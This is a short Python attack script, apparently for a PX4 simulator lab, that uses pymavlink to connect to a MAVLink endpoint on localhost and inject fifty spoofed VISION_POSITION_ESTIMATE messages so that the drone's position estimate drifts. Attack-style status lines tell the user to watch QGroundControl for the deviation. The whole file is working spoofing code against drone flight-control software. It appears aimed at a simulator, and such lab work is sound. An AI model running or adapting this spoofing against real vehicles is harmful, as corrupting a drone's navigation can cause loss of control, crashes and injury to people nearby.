from pymavlink import mavutil
import time

drone = mavutil.mavlink_connection(
    'udp:127.0.0.1:18570',
    input=False,
    source_system=255
)

print("[+] Attack connection ready")
print("[*] Injecting spoofed VISION_POSITION_ESTIMATE messages...")
print("[*] Watch QGC for position deviation\n")

for i in range(50):
    drone.mav.vision_position_estimate_send(
        usec=int(time.time() * 1e6),
        x=float(i * 0.5),
        y=float(i * 0.3),
        z=-2.0,
        roll=0.0,
        pitch=0.0,
        yaw=0.0
    )
    print(f"[+] Injected → x={i*0.5:.1f}m  y={i*0.3:.1f}m  z=-2.0m")
    time.sleep(0.1)

print("\n[!] Attack sequence complete — check QGC and PX4 terminal")
